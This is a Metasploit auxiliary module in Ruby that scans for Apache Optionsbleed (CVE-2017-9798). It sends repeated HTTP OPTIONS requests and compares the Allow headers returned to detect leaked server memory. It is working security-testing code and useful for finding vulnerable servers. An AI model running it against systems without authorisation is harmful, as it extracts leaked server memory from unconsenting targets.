##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Apache Optionsbleed Scanner',
      'Description' => %q{
        This module scans for the Apache optionsbleed vulnerability where the Allow
        response header returned from an OPTIONS request may bleed memory if the
        server has a .htaccess file with an invalid Limit method defined.
      },
      'Author' => [
        'Hanno Böck', # Vulnerability discovery
        'h00die', # Metasploit module
      ],
      'References' => [
        [ 'AKA', 'Optionsbleed' ],
        [ 'CVE', '2017-9798' ],
        [ 'EDB', '42745' ],
        [ 'URL', 'https://github.com/hannob/optionsbleed' ],
        [ 'URL', 'https://blog.fuzzing-project.org/60-Optionsbleed-HTTP-OPTIONS-method-can-leak-Apaches-server-memory.html' ]
      ],
      'DisclosureDate' => 'Sep 18 2017',
      'License' => MSF_LICENSE
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'The URI to the folder with the vulnerable .htaccess file', '/']),
      OptInt.new('REPEAT', [true, 'Times to attempt', 40]),
      OptBool.new('BUGS', [true, 'Print if any other Allow header bugs are found', true])
    ])
  end

  def get_allow_header(ip)
    res = send_request_raw({
      'version' => '1.1',
      'method'  => 'OPTIONS',
      'uri'     => datastore['TARGETURI']
    }, 10)
    if res
      if res.headers['Allow']
        return res.headers['Allow']
      else #now allow header returned
        fail_with(Failure::UnexpectedReply, "#{peer} - No Allow header identified")
      end
    else
      fail_with(Failure::Unreachable, "#{peer} - Failed to respond")
    end
  end

  def run_host(ip)
    bug_61207 = /^[a-zA-Z]+(-[a-zA-Z]+)? *(, *[a-zA-Z]+(-[a-zA-Z]+)? *)*$/
    bug_1717682 = /^[a-zA-Z]+(-[a-zA-Z]+)? *( +[a-zA-Z]+(-[a-zA-Z]+)? *)+$/
    uniques = []
    for counter in 1..datastore['REPEAT']
      allows = get_allow_header(ip)
      if !uniques.include?(allows)
        uniques << allows
        if allows =~ bug_61207
          if allows.split(',').length > allows.split(',').uniq.length
            if datastore['BUGS']
              print_status('Some methods were sent multiple times in the list.
                       This is a bug, but harmless. It may be Apache bug #61207.')
            end
          else
            vprint_status('Normal Response')
          end
        elsif allows =~ bug_1717682
          if datastore['BUGS']
            print_status('The list of methods was space-separated instead of comma-separated.
                       This is a bug, but harmless. It may be Launchpad bug #1717682.')
          end
        else
          print_good('Options Bleed Response')
        end
        print_good("New Unique Response on Request #{counter}: #{allows}")
      end
    end
    if uniques.length > 1
      print_good("More than one Accept header received.  #{peer} is Most likely vulnerable")
      uniques.each do |allow|
        print_good(allow.to_s)
      end
    end
  end

end
